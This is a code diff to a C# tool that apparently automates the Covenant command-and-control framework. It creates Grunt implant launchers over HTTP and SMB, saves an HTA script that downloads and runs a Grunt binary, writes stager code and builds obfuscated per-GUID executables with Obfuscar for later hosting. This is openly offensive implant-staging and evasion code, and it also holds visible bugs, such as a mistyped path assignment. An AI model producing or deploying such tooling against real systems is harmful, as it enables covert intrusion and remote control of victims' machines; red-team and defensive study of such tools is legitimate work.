@@ -5,6 +5,13 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Collections.Generic;
 using McMaster.Extensions.CommandLineUtils;
+
+
+
+using Microsoft.Build;
+using Microsoft.Build.Engine;
+using Microsoft.Build.Evaluation;
+
 using Covenant.API;
 using Covenant.API.Models;
 using System.Net.Http;
@@ -17,6 +24,10 @@ namespace Scorpion.Jobs
   public class SetupJob : Job
   {
     public int TargetPort = 8080;
+
+    public string TargetDefaultHttpTemplate = "GruntHTTP";
+    public string TargetDefaultSmbTemplate = "GruntSMB";
+
     public SetupJob(IConsole console, CovenantAPI api) : base(console, api) { }
 
     public async Task<int> RunAsync(string connectAddress)
@@ -55,22 +66,46 @@ namespace Scorpion.Jobs
       Console.WriteLine("Saving HTA Script That Dowloands/Execs Default Grunt Binary");
       File.WriteAllBytes(defaultHttpHtaPath, Encoding.ASCII.GetBytes(htaToDownloadAndExecBin));
 
-      for (int i = 0; i < 20; i++) {
+      for (int i = 0; i < 5; i++) {
         var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
+        var projDir = Path.Join(dataDir, aGuid);
+        if (!Directory.Exists(projDir)) {
+          Directory.CreateDirectory(projDir);
+        }
+
         Console.WriteLine($"Generating csproj for {aGuid}");
 
-        var csproj = GenerateCsprojFile(aGuid, dataDir);
+        var csproj = GenerateCsprojFile(aGuid, projDir);
         var csprojName = aGuid + ".csproj";
-        var csprojPath = Path.Join(dataDir, csprojName);
+        var csprojPath = Path.Join(projDir, csprojName);
         Console.WriteLine($"Saving csproj for {aGuid}");
         File.WriteAllBytes(csprojPath, Encoding.ASCII.GetBytes(csproj));
 
         Console.WriteLine($"Generating Obfuscar for {aGuid}");
-        var obfuscar = GenerateObfuscarFile(aGuid, dataDir);
+        var obfuscar = GenerateObfuscarFile(aGuid, projDir);
         var obfuscarName = aGuid + ".xml";
-        var obfuscarPath = Path.Join(dataDir, obfuscarName);
+        var obfuscarPath = Path.Join(projDir, obfuscarName);
         Console.WriteLine($"Saving Obfuscar for {aGuid}");
         File.WriteAllBytes(obfuscarPath, Encoding.ASCII.GetBytes(obfuscar));
+
+        BinaryLauncher smbLauncher = await GenerateBasicSmbGruntBinary(aGuid, listener);
+        var rawSmbBin = Convert.FromBase64String(smbLauncher.Base64ILByteString);
+        var smbBinPath = Path.Join(projDir, "GruntStager.exe");
+        Console.WriteLine("Saving Unobfuscated Grunt Binary");
+        File.WriteAllBytes(smbBinPath, rawSmbBin);
+        var smbSrcPath = Path.Join(projDir, aGuid = ".cs");
+        Console.WriteLine("Saving SMB Grunt Stager Code");
+        File.WriteAllBytes(smbSrcPath, Encoding.ASCII.GetBytes(smbLauncher.StagerCode));
+        Console.WriteLine("Loading csproj for prgramatic build");
+        var collection = ProjectCollection.GlobalProjectCollection;
+        var project = collection.LoadProject(csprojPath);
+        project.SetProperty("Configuration", "Release");
+        project.Build();
+
+        // msbuild csproj
+        // obsfucate output
+        // host ob bin at /aGuidob.exe
+
         // TODO: need to implement implant functionality to find the correct implant template
         // for smb
       }
@@ -109,22 +144,23 @@ Write-Output ""Error"";
     public async Task<BinaryLauncher> GenerateBasicHttpGruntBinary(HttpListener listener)
     {
       var request = new RequestBuilder(Api);
+      var template = request.GetImplantTemplateByName(TargetDefaultHttpTemplate);
+      var kd = new DateTime();
+      kd.AddDays(60);
 
       var bin = new BinaryLauncher();
       bin.ListenerId = listener.Id;
       bin.Name = "DefaultHttpBin";
       bin.Description = "Default HTTP Binary";
       bin.DotNetFrameworkVersion = DotNetVersion.Net40;
-      bin.Type = LauncherType.Wmic;
-      bin.ImplantTemplateId = 1;
+      bin.Type = LauncherType.Binary;
+      bin.ImplantTemplateId = template.Id;
       bin.ValidateCert = true;
       bin.UseCertPinning = true;
       bin.SmbPipeName = "doesnotmatter";
       bin.JitterPercent = 10;
       bin.Delay = 1;
       bin.ConnectAttempts = 5000;
-      var kd = new DateTime();
-      kd.AddDays(60);
       bin.KillDate = kd;
       bin.LauncherString = "";
       bin.StagerCode = "";
@@ -132,23 +168,36 @@ Write-Output ""Error"";
       bin.OutputKind = OutputKind.ConsoleApplication;
       bin.CompressStager = true;
       return await request.CreateBinaryLauncher(bin);
+    }
 
-      // Id=1
-      // Type=Binary
-      // Description=Uses+a+generated+.NET+Framework+binary+to+launch+a+Grunt.
-      // ListenerId=1
-      // ImplantTemplateId=1 # GruntHTTP
-      // ValidateCert=True
-      // UseCertPinning=True
-      // SMBPipeName=gruntsvc
-      // Delay=5
-      // JitterPercent=10
-      // ConnectAttempts=5000
-      // KillDate=12%2F31%2F2020+12%3A00+AM
-      // DotNetFrameworkVersion=0
-      // LauncherString=
-      // StagerCode=
-      // Base64ILByteString=
+
+    public async Task<BinaryLauncher> GenerateBasicSmbGruntBinary(string aGuid, HttpListener listener)
+    {
+      var request = new RequestBuilder(Api);
+      var template = request.GetImplantTemplateByName(TargetDefaultSmbTemplate);
+      var kd = new DateTime();
+      kd.AddDays(60);
+
+      var bin = new BinaryLauncher();
+      bin.ListenerId = listener.Id;
+      bin.Name = "SmbBin-" + aGuid;
+      bin.Description = "SMB Binary " + aGuid;
+      bin.DotNetFrameworkVersion = DotNetVersion.Net40;
+      bin.Type = LauncherType.Binary;
+      bin.ImplantTemplateId = template.Id;
+      bin.ValidateCert = true;
+      bin.UseCertPinning = true;
+      bin.SmbPipeName = aGuid;
+      bin.JitterPercent = 10;
+      bin.Delay = 1;
+      bin.ConnectAttempts = 5000;
+      bin.KillDate = kd;
+      bin.LauncherString = "";
+      bin.StagerCode = "";
+      bin.Base64ILByteString = "";
+      bin.OutputKind = OutputKind.ConsoleApplication;
+      bin.CompressStager = true;
+      return await request.CreateBinaryLauncher(bin);
     }
 
     public async Task<HttpListener> CreateListener(string connectAddress)
@@ -180,7 +229,7 @@ Write-Output ""Error"";
       });
     }
 
-    public string GenerateObfuscarFile(string aGuid, string dataDir)
+    public string GenerateObfuscarFile(string aGuid, string projDir)
     {
       var obfuscarXml = String.Format(@"
 <?xml version=""1.0"" encoding=""utf-8""?>
@@ -190,12 +239,12 @@ Write-Output ""Error"";
 	<Var name=""KeepPublicApi"" value=""false"" />
 	<Var name=""HidePrivateApi"" value=""true"" />
 	<Module file=""{1}"" />
-</Obfuscator>", dataDir, Path.Join(dataDir, aGuid + ".exe"));
+</Obfuscator>", projDir, Path.Join(projDir, aGuid + ".exe"));
       return obfuscarXml;
     }
 
 
-    public string GenerateCsprojFile(string aGuid, string dataDir)
+    public string GenerateCsprojFile(string aGuid, string projDir)
     {
       var csproj = String.Format(@"
 <?xml version=""1.0"" encoding=""utf-8""?>
@@ -256,7 +305,7 @@ Write-Output ""Error"";
       <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {{{{0}}.</ErrorText>
     </PropertyGroup>
   </Target>
-</Project>", aGuid, dataDir);
+</Project>", aGuid, projDir);
       return csproj;
     }
   }
